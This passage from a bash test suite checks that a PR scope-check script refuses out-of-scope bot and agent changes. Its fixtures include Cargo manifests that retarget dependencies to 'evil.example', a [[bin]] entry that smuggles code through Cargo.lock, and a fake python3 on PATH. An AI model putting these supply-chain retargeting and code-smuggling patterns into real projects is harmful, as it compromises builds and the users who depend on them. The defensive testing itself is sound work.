printf '[workspace]\nresolver="2"\nmembers=["crates/pol"]\n\n[patch.crates-io]\nlibc = "https://evil.example/libc"\n' > "$D46d/Cargo.toml"
commit_all "$D46d" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== an EXISTING [patch.crates-io] entry whose bare string value is retargeted must be refused, not treated as a dependency-table version move =="
OUT46d="$(run_scope "$D46d")" && RC46d=0 || RC46d=$?
if [ "$RC46d" -eq 0 ]; then
  echo "FAIL: case 46d was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT46d" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT46d" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an existing [patch.crates-io] entry retargeted was reported EXEMPT. Got:"
  echo "$OUT46d" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT46d" | grep -qF 'patch.crates-io'; then
  echo "FAIL: refused, but the patch.crates-io entry was not named. Got:"
  echo "$OUT46d" | sed 's/^/    /'
  FAILED=1
else
  note "an existing [patch.crates-io] entry retargeted is refused and named"
fi

# ---------------------------------------------------------------------------
# 46e. No case in this file exercises the missing-'## Files'-table refusal
#      (line 751) at all, so nothing pins it: a coder-agent PR closing a real
#      issue whose body has no `## Files` heading anywhere must be refused
#      for exactly that reason, checked by rc as well as by text, the same as
#      every other exit site in this round.
# ---------------------------------------------------------------------------
D46e="$WORK/no-files-table"
new_repo "$D46e"
mkdir -p "$D46e/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D46e/crates/pol/Cargo.toml"
commit_all "$D46e" base
git -C "$D46e" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.1"\n' > "$D46e/crates/pol/Cargo.toml"
commit_all "$D46e" implement
fake_gh 'coder-agent' 'Closes #42' 'Just a description of the change. No Files heading anywhere in this body.'
echo "== an issue with no '## Files' table anywhere must be refused =="
OUT46e="$(run_scope "$D46e")" && RC46e=0 || RC46e=$?
if [ "$RC46e" -eq 0 ]; then
  echo "FAIL: case 46e was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT46e" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT46e" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a PR whose issue has no Files table at all was reported as matching. Got:"
  echo "$OUT46e" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT46e" | grep -qF "has no '## Files' table"; then
  echo "FAIL: refused, but not for the missing-Files-table reason. Got:"
  echo "$OUT46e" | sed 's/^/    /'
  FAILED=1
else
  note "an issue with no '## Files' table is refused for that reason"
fi

echo
# ---------------------------------------------------------------------------

# ===========================================================================
# ROUND SEVEN. Round six's own review found this file's earlier rounds had a
# recurring shape: pin the exact mutant a reviewer named, leave its sibling
# open. This round instead enumerates EVERY array expansion in the script
# (both `changed` and `declared`), and adds one case per site that was not
# already pinned by an existing case, verified mechanically: every one of the
# 13 `for x in "${arr[@]}"` loops in scripts/pr-scope-check.sh (lines 251, 632,
# 640, 653, 764, 768, 785, 790, 802, 817, 824, 876, 879) plus the DECLARED
# array's own population (lines 758-761) was unquoted one at a time and run
# against the pre-round-seven suite; four sites (251, 632, 785, 802) were
# already caught by cases 10, 1/2, 20 and 19 respectively and needed nothing
# new; the remaining nine were green (unpinned) and each gets its own case
# below (48-54). Cases 55-69 close the review's SHOULD_FIX findings the same
# way: every one was reproduced as a real, green mutant against this file
# before its case was written.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 48. BLOCKING (round seven). The manifest-capability loop (line 640) that
#     decides WHICH Cargo.toml files get handed to manifest_disallowed_diff
#     must be pinned the same way the allowlist-membership loop at line 632
#     already is. BOT_ALLOWED's `crates/[^/]+/fuzz/Cargo\.toml` accepts a
#     crate directory name containing a SPACE, so `crates/my crate/fuzz/
#     Cargo.toml` is a real, single, allowlisted path. An unquoted `for f in
#     ${changed[*]}` at line 640 re-splits that ONE path into two words,
#     "crates/my" and "crate/fuzz/Cargo.toml", neither of which is the real
#     manifest; the second happens to still match the `*/Cargo.toml` case
#     pattern, so `manifest_disallowed_diff` is called on a PATH THAT DOES
#     NOT EXIST at either commit, silently returns no offense, and the real,
#     capability-gaining manifest is never inspected at all.
# ---------------------------------------------------------------------------
D48="$WORK/manifest-loop-unquoted-space-crate"
new_repo "$D48"
mkdir -p "$D48/crates/my crate/fuzz/fuzz_targets"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D48/crates/my crate/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D48/crates/my crate/fuzz/fuzz_targets/t.rs"
printf '# placeholder fuzz lockfile\n' > "$D48/crates/my crate/fuzz/Cargo.lock"
commit_all "$D48" base
git -C "$D48" checkout -qb pr
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\nedition="2021"\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n\n[[bin]]\nname="evil"\npath="Cargo.lock"\n' > "$D48/crates/my crate/fuzz/Cargo.toml"
printf 'fn main(){ /* arbitrary code smuggled via a space-containing allowlisted crate dir */ }\n' > "$D48/crates/my crate/fuzz/Cargo.lock"
commit_all "$D48" "chore(deps): bump libfuzzer-sys"
fake_gh 'dependabot[bot]' ''
echo "== the manifest-capability loop must inspect a space-containing allowlisted crate manifest by its real path =="
OUT48="$(run_scope "$D48")" && RC48=0 || RC48=$?
if [ "$RC48" -eq 0 ]; then
  echo "FAIL: case 48 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT48" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT48" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: an appended [[bin]] entry inside a space-containing allowlisted crate manifest was reported EXEMPT. Got:"
  echo "$OUT48" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT48" | grep -qF 'my crate/fuzz/Cargo.toml'; then
  echo "FAIL: refused, but not by naming the real, space-containing manifest path. Got:"
  echo "$OUT48" | sed 's/^/    /'
  FAILED=1
else
  note "the space-containing allowlisted crate manifest is inspected by its real path, and refused"
fi

# ---------------------------------------------------------------------------
# 49. BLOCKING (round seven). The DECLARED array's population itself (the
#     `while IFS= read -r d` loop building `declared` from `declared_raw`)
#     must be pinned, not just the loops that later consume it. Reverting
#     that population to `for d in $declared_raw` (unquoted) word-splits
#     every declared path on whitespace at the point the array is BUILT, so
#     every downstream loop over `"${declared[@]}"`, even though each one is
#     itself correctly quoted, ends up iterating over the WRONG elements. The
#     issue declares exactly ONE path, containing a literal space:
#     `docs.md src/evil.rs`. The PR touches ONLY `src/evil.rs`, which was
#     never declared on its own.
# ---------------------------------------------------------------------------
D49="$WORK/declared-population-unquoted-bypass"
new_repo "$D49"
mkdir -p "$D49/src"
printf 'safe\n' > "$D49/src/keep.rs"
commit_all "$D49" base
git -C "$D49" checkout -qb pr
printf 'evil\n' > "$D49/src/evil.rs"
commit_all "$D49" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `docs.md src/evil.rs` | modify | one declared row, one backtick span, a literal space inside it |
'
echo "== the declared array's own population must not word-split a single space-containing declared row =="
OUT49="$(run_scope "$D49")" && RC49=0 || RC49=$?
if [ "$RC49" -eq 0 ]; then
  echo "FAIL: case 49 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT49" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT49" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: src/evil.rs was reported as matching, even though only 'docs.md src/evil.rs' (one space-containing row) was declared. Got:"
  echo "$OUT49" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT49" | grep -qF 'src/evil.rs'; then
  echo "FAIL: refused, but src/evil.rs was not named among the undeclared paths. Got:"
  echo "$OUT49" | sed 's/^/    /'
  FAILED=1
else
  note "a single space-containing declared row is not word-split into two separately-matching declared paths"
fi

# ---------------------------------------------------------------------------
# 50. BLOCKING (round seven). The cargo_lock_exempt loop's DECLARED side
#     (line 790) must be pinned independently of its CHANGED side (already
#     pinned by case 20). The issue declares one row containing a literal
#     space that is NOT the real manifest path: `unrelated.md
#     crates/pol/Cargo.toml`. The PR changes the real `crates/pol/Cargo.toml`
#     (itself correctly refused as undeclared either way) alongside the root
#     `Cargo.lock`. A properly quoted `for d in "${declared[@]}"` never finds
#     an exact match for `crates/pol/Cargo.toml` against the one, whole,
#     space-containing declared string, so `cargo_lock_exempt` stays 0 and
#     the root `Cargo.lock` is ALSO refused, named. `for d in ${declared[*]}`
#     re-splits that one element into "unrelated.md" and
#     "crates/pol/Cargo.toml", the second of which exactly matches the real
#     manifest path, wrongly sets `cargo_lock_exempt=1`, and the root
#     `Cargo.lock` silently disappears from the refusal listing even though
#     the overall PR is still refused for the unrelated manifest, exactly the
#     "still refused overall, but one real offense goes unnamed" shape case
#     20 already tests for the changed side.
# ---------------------------------------------------------------------------
D50="$WORK/cargo-lock-exempt-declared-loop-unquoted-bypass"
new_repo "$D50"
mkdir -p "$D50/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D50/crates/pol/Cargo.toml"
printf 'placeholder\n' > "$D50/Cargo.lock"
commit_all "$D50" base
git -C "$D50" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.1"\n' > "$D50/crates/pol/Cargo.toml"
printf 'bumped\n' > "$D50/Cargo.lock"
commit_all "$D50" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `unrelated.md crates/pol/Cargo.toml` | modify | one declared row, one backtick span, a literal space inside it |
'
echo "== the cargo_lock_exempt loop must not be fooled by a declared row that word-splits into the real manifest path =="
OUT50="$(run_scope "$D50")" && RC50=0 || RC50=$?
if [ "$RC50" -eq 0 ]; then
  echo "FAIL: case 50 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT50" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT50" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: reported as matching, even though the manifest is only declared inside a space-containing row. Got:"
  echo "$OUT50" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT50" | grep -qE '^ {4}Cargo\.lock$'; then
  echo "FAIL: root Cargo.lock was not named among the refused (undeclared) paths, meaning cargo_lock_exempt was wrongly set. Got:"
  echo "$OUT50" | sed 's/^/    /'
  FAILED=1
else
  note "root Cargo.lock is correctly named as undeclared; a space-splitting declared row does not silently exempt it"
fi

# ---------------------------------------------------------------------------
# 51. BLOCKING (round seven). The nested-lockfile sibling-declared loop (line
#     817) must be pinned independently. The issue declares one row
#     containing a literal space that is NOT the real sibling manifest path:
#     `notes.md crates/pol/fuzz/Cargo.toml`. The PR touches ONLY the nested
#     lockfile `crates/pol/fuzz/Cargo.lock`; its sibling manifest is
#     untouched and, read as a WHOLE string, was never actually declared. A
#     properly quoted `for d in "${declared[@]}"` never matches the sibling
#     against the one, whole, space-containing declared string, so the
#     lockfile is refused as undeclared, same as case 46 above. `for d in
#     ${declared[*]}` re-splits it into "notes.md" and
#     "crates/pol/fuzz/Cargo.toml", the second of which exactly equals the
#     sibling, wrongly sets `sib_declared=1`, and the loop `continue`s past
#     this path ENTIRELY: since it is the only changed file, the whole PR is
#     reported as matching its issue with rc=0, a FULL false pass, not merely
#     a differently-worded refusal.
# ---------------------------------------------------------------------------
D51="$WORK/nested-lockfile-sibling-declared-loop-unquoted-bypass"
new_repo "$D51"
mkdir -p "$D51/crates/pol/fuzz/fuzz_targets"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D51/crates/pol/Cargo.toml"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D51/crates/pol/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D51/crates/pol/fuzz/fuzz_targets/t.rs"
printf 'placeholder\n' > "$D51/crates/pol/fuzz/Cargo.lock"
commit_all "$D51" base
git -C "$D51" checkout -qb pr
printf 'attacker-controlled content, no DECLARED sibling ties it to anything reviewed\n' > "$D51/crates/pol/fuzz/Cargo.lock"
commit_all "$D51" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `notes.md crates/pol/fuzz/Cargo.toml` | modify | one declared row, one backtick span, a literal space inside it |
'
echo "== the nested-lockfile sibling loop must not be fooled by a declared row that word-splits into the sibling path =="
OUT51="$(run_scope "$D51")" && RC51=0 || RC51=$?
if [ "$RC51" -eq 0 ]; then
  echo "FAIL: case 51 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT51" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT51" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: the nested lockfile was forgiven, even though its sibling is only declared inside a space-containing row. Got:"
  echo "$OUT51" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT51" | grep -qF 'crates/pol/fuzz/Cargo.lock'; then
  echo "FAIL: refused, but the nested lockfile was not named among the undeclared paths. Got:"
  echo "$OUT51" | sed 's/^/    /'
  FAILED=1
else
  note "the nested lockfile is refused and named; a space-splitting declared row does not silently exempt it"
fi

# ---------------------------------------------------------------------------
# 52. The "declared but not modified" NOTE loop (lines 876/879) must be
#     pinned on BOTH its declared (outer) and changed (inner) sides. A single
#     file, `x y.rs`, containing a literal space, is declared AND actually
#     touched by this PR: read as a WHOLE, "x y.rs" (declared) equals
#     "x y.rs" (changed), so no NOTE should be printed at all. Unquoting
#     EITHER `for d in "${declared[@]}"` (876) or `for f in "${changed[@]}"`
#     (879) re-splits the one space-containing element into "x" and "y.rs" on
#     whichever side is unquoted; neither fragment equals the other side's
#     value (whole or fragment), so `found` stays 0 and a spurious "declared
#     but not modified" NOTE is printed for a file that was, in fact,
#     modified. This is message-quality, not a scope bypass (the overall
#     verdict does not change), but it is exactly the kind of silently wrong
#     human-facing signal #836 already showed this file cannot afford.
# ---------------------------------------------------------------------------
D52="$WORK/untouched-note-loop-unquoted-space-file"
new_repo "$D52"
printf 'orig\n' > "$D52/x y.rs"
commit_all "$D52" base
git -C "$D52" checkout -qb pr
printf 'changed\n' > "$D52/x y.rs"
commit_all "$D52" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `x y.rs` | modify | one declared row, one backtick span, a literal space inside it, actually touched |
'
echo "== a space-containing file that is both declared and touched must not spuriously appear as declared-but-not-modified =="
OUT52="$(run_scope "$D52")" && RC52=0 || RC52=$?
if [ "$RC52" -ne 0 ]; then
  echo "FAIL: case 52 was expected to pass (rc=0) but exited non-zero (rc=$RC52)." >&2
  echo "$OUT52" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT52" | grep -qF 'declared but not modified'; then
  echo "FAIL: a space-containing file that WAS modified was reported as declared but not modified. Got:"
  echo "$OUT52" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT52" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: the matching PR was not reported as matching. Got:"
  echo "$OUT52" | sed 's/^/    /'
  FAILED=1
else
  note "a space-containing declared-and-touched file produces no spurious untouched NOTE"
fi

# ---------------------------------------------------------------------------
# 53. The EXEMPT file-listing loop (line 653) must be pinned. It is cosmetic
#     (the verdict is already decided before it runs), but a human reviewing
#     an EXEMPT verdict reads exactly this listing, and `--no-renames`
#     earlier in this file exists BECAUSE that listing is trusted. A
#     legitimate bot bump touches a real, single, space-containing
#     allowlisted path (`crates/my crate/Cargo.toml`, one dependency version
#     string moved). A properly quoted `for f in "${changed[@]}"` prints that
#     one path whole. `for f in ${changed[*]}` re-splits it into two lines,
#     "crates/my" and "crate/Cargo.toml", neither of which is the real path
#     a reviewer could act on.
# ---------------------------------------------------------------------------
D53="$WORK/exempt-listing-loop-unquoted-space-path"
new_repo "$D53"
mkdir -p "$D53/crates/my crate"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D53/crates/my crate/Cargo.toml"
commit_all "$D53" base
git -C "$D53" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D53/crates/my crate/Cargo.toml"
commit_all "$D53" "chore(deps): bump serde"
fake_gh 'dependabot[bot]' ''
echo "== the EXEMPT listing loop must print a space-containing allowlisted path whole =="
OUT53="$(run_scope "$D53")" && RC53=0 || RC53=$?
if [ "$RC53" -ne 0 ]; then
  echo "FAIL: case 53 was expected to pass (rc=0) but exited non-zero (rc=$RC53)." >&2
  echo "$OUT53" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT53" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a legitimate space-containing-path bot bump was not reported EXEMPT. Got:"
  echo "$OUT53" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT53" | grep -qE '^ {4}crates/my crate/Cargo\.toml$'; then
  echo "FAIL: the EXEMPT listing did not print the real, whole, space-containing path. Got:"
  echo "$OUT53" | sed 's/^/    /'
  FAILED=1
else
  note "the EXEMPT listing prints a space-containing allowlisted path whole, not re-split"
fi

# ---------------------------------------------------------------------------
# 54. The two informational listing loops on the non-bot path ("declared in
#     issue #N:" at line 764, and "changed by this PR:" at line 768) must
#     each print a space-containing path whole, not re-split. One declared,
#     matching, space-containing file: `a b.rs`.
# ---------------------------------------------------------------------------
D54="$WORK/nonbot-listing-loops-unquoted-space-path"
new_repo "$D54"
printf 'orig\n' > "$D54/a b.rs"
commit_all "$D54" base
git -C "$D54" checkout -qb pr
printf 'changed\n' > "$D54/a b.rs"
commit_all "$D54" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `a b.rs` | modify | one declared row, one backtick span, a literal space inside it |
'
echo "== the non-bot declared/changed listing loops must print a space-containing path whole =="
OUT54="$(run_scope "$D54")" && RC54=0 || RC54=$?
if [ "$RC54" -ne 0 ]; then
  echo "FAIL: case 54 was expected to pass (rc=0) but exited non-zero (rc=$RC54)." >&2
  echo "$OUT54" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT54" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a matching space-containing declared/changed file was not reported as matching. Got:"
  echo "$OUT54" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT54" | grep -qE '^declared in issue #42:$'; then
  echo "FAIL: could not even find the 'declared in issue' header. Got:"
  echo "$OUT54" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT54" | awk '/^declared in issue #42:$/{f=1;next}/^changed by this PR:$/{f=0}f' | grep -qE '^  a b\.rs$'; then
  echo "FAIL: the 'declared in issue' listing did not print the space-containing path whole. Got:"
  echo "$OUT54" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT54" | awk '/^changed by this PR:$/{f=1;next}/^$/{f=0}f' | grep -qE '^  a b\.rs$'; then
  echo "FAIL: the 'changed by this PR' listing did not print the space-containing path whole. Got:"
  echo "$OUT54" | sed 's/^/    /'
  FAILED=1
else
  note "both non-bot listing loops print a space-containing path whole, not re-split"
fi

# ---------------------------------------------------------------------------
# 55. dep_entry_offenses' INTRODUCE arm (line 521) must be pinned. An
#     existing detailed-table dependency gains a brand new `git` sub-key,
#     retargeting where Cargo fetches it from. Only the CHANGED arm (cases 29
#     and 37) had a case; introduce and remove did not.
# ---------------------------------------------------------------------------
D55="$WORK/dep-entry-introduce-arm"
new_repo "$D55"
mkdir -p "$D55/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.0" }\n' > "$D55/crates/pol/Cargo.toml"
commit_all "$D55" base
git -C "$D55" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.0", git = "https://evil.example/serde" }\n' > "$D55/crates/pol/Cargo.toml"
commit_all "$D55" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a newly INTRODUCED sub-key (git) on an existing detailed dependency must be refused =="
OUT55="$(run_scope "$D55")" && RC55=0 || RC55=$?
if [ "$RC55" -eq 0 ]; then
  echo "FAIL: case 55 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT55" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT55" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a newly introduced git= sub-key was reported EXEMPT. Got:"
  echo "$OUT55" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT55" | grep -qF 'introduces dependencies.serde.git'; then
  echo "FAIL: refused, but the introduced git sub-key was not named. Got:"
  echo "$OUT55" | sed 's/^/    /'
  FAILED=1
else
  note "a newly introduced dependency sub-key is refused and named"
fi

# ---------------------------------------------------------------------------
# 56. dep_entry_offenses' REMOVE arm (line 523) must be pinned. An existing
#     detailed-table dependency's `default-features = false` disappears,
#     silently switching on default features that were deliberately off.
# ---------------------------------------------------------------------------
D56="$WORK/dep-entry-remove-arm"
new_repo "$D56"
mkdir -p "$D56/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.0", default-features = false }\n' > "$D56/crates/pol/Cargo.toml"
commit_all "$D56" base
git -C "$D56" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = { version = "1.0" }\n' > "$D56/crates/pol/Cargo.toml"
commit_all "$D56" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a REMOVED sub-key (default-features) on an existing detailed dependency must be refused =="
OUT56="$(run_scope "$D56")" && RC56=0 || RC56=$?
if [ "$RC56" -eq 0 ]; then
  echo "FAIL: case 56 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT56" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT56" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a removed default-features sub-key was reported EXEMPT. Got:"
  echo "$OUT56" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT56" | grep -qF 'removes dependencies.serde.default-features'; then
  echo "FAIL: refused, but the removed default-features sub-key was not named. Got:"
  echo "$OUT56" | sed 's/^/    /'
  FAILED=1
else
  note "a removed dependency sub-key is refused and named"
fi

# ---------------------------------------------------------------------------
# 57. The list branch's REMOVED-entry arm (line 576) must be pinned; round
#     six pinned append (46b) and edit (38) but left this third arm of the
#     same three-arm branch. A `[[bin]]` array shrinks from two entries to
#     one: the whole second entry disappears.
# ---------------------------------------------------------------------------
D57="$WORK/list-branch-remove-arm"
new_repo "$D57"
mkdir -p "$D57/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n\n[[bin]]\nname="a"\npath="a.rs"\n\n[[bin]]\nname="b"\npath="b.rs"\n' > "$D57/crates/pol/Cargo.toml"
commit_all "$D57" base
git -C "$D57" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\nedition="2021"\n\n[[bin]]\nname="a"\npath="a.rs"\n' > "$D57/crates/pol/Cargo.toml"
commit_all "$D57" "chore(deps): bump"
fake_gh 'dependabot[bot]' ''
echo "== a REMOVED array entry ([[bin]] shrinking) must be refused, named by its index =="
OUT57="$(run_scope "$D57")" && RC57=0 || RC57=$?
if [ "$RC57" -eq 0 ]; then
  echo "FAIL: case 57 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT57" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT57" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a shrunken [[bin]] array was reported EXEMPT. Got:"
  echo "$OUT57" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT57" | grep -qF 'removes bin[1]'; then
  echo "FAIL: refused, but the removed array entry was not named as bin[1]. Got:"
  echo "$OUT57" | sed 's/^/    /'
  FAILED=1
else
  note "a removed array entry is refused and named, pinning the list branch's remove arm"
fi

# ---------------------------------------------------------------------------
# 58. FAIL CLOSED: `set -e` (line 20) is the only thing that turns "the
#     manifest engine could not run at all" into a refusal, because
#     `cap="$(manifest_disallowed_diff "$f")"` is a plain assignment whose
#     own exit status is the embedded python3's. Without `set -e`, a python3
#     that cannot run leaves `cap` empty, `[ -n "$cap" ]` false, and the
#     manifest silently contributes no offense. This puts a FAILING `python3`
#     ahead of the real one on PATH for the one case that needs it (the same
#     technique case 35 already uses for `git`), so the bot PR's own manifest
#     capability check cannot actually run.
# ---------------------------------------------------------------------------
D58="$WORK/manifest-engine-python3-unavailable"
new_repo "$D58"
mkdir -p "$D58/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D58/crates/pol/Cargo.toml"
commit_all "$D58" base
git -C "$D58" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D58/crates/pol/Cargo.toml"
commit_all "$D58" "chore(deps): bump serde"
fake_gh 'dependabot[bot]' ''
cat > "$FAKEBIN/python3" <<'PYWRAP'
#!/usr/bin/env bash
echo "fake python3: simulated missing interpreter" >&2
exit 1
PYWRAP
chmod +x "$FAKEBIN/python3"
echo "== a bot PR whose manifest engine cannot run (no working python3) must fail closed, not EXEMPT =="
OUT58="$(run_scope "$D58")" && RC58=0 || RC58=$?
rm -f "$FAKEBIN/python3"
if [ "$RC58" -eq 0 ]; then
  echo "FAIL: case 58 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT58" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT58" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a bot PR whose manifest engine could not run was reported EXEMPT. Got:"
  echo "$OUT58" | sed 's/^/    /'
  FAILED=1
else
  note "an unavailable manifest engine fails the whole check closed (rc=$RC58), not EXEMPT"
fi

# ---------------------------------------------------------------------------
# 59. The declared_raw parser's "reset on ANY heading" rule (line 712) must
#     be pinned. An issue puts a `## Files` section declaring one real file,
#     then a LATER `## Notes` section containing its own backticked table
#     with an unrelated path. That path must NOT be treated as declared. The
#     PR touches ONLY that unrelated path.
# ---------------------------------------------------------------------------
D59="$WORK/files-parser-heading-reset"
new_repo "$D59"
mkdir -p "$D59/src"
printf 'orig\n' > "$D59/src/keep.rs"
commit_all "$D59" base
git -C "$D59" checkout -qb pr
printf 'evil\n' > "$D59/src/evil.rs"
commit_all "$D59" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `src/keep.rs` | modify | the one real declared file |

## Notes

Some unrelated commentary with its own table, not a Files declaration:

| Path | Detail |
| --- | --- |
| `src/evil.rs` | this is NOT a Files row |
'
echo "== a backticked table inside a LATER, non-Files heading must not be treated as declared =="
OUT59="$(run_scope "$D59")" && RC59=0 || RC59=$?
if [ "$RC59" -eq 0 ]; then
  echo "FAIL: case 59 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT59" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT59" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: src/evil.rs, declared only inside a ## Notes table, was reported as matching. Got:"
  echo "$OUT59" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT59" | grep -qF 'src/evil.rs'; then
  echo "FAIL: refused, but src/evil.rs was not named among the undeclared paths. Got:"
  echo "$OUT59" | sed 's/^/    /'
  FAILED=1
else
  note "a table nested inside a later, non-Files heading is not treated as a Files declaration"
fi

# ---------------------------------------------------------------------------
# 60. The declared_raw parser's "every legitimate row backticks its path"
#     rule (line 727) must be pinned. The `## Files` table has one properly
#     backticked row and one row whose first cell is bare (unbackticked); the
#     bare row must be skipped, not declared. The PR touches ONLY the bare
#     row's path.
# ---------------------------------------------------------------------------
D60="$WORK/files-parser-unbackticked-row"
new_repo "$D60"
mkdir -p "$D60/src"
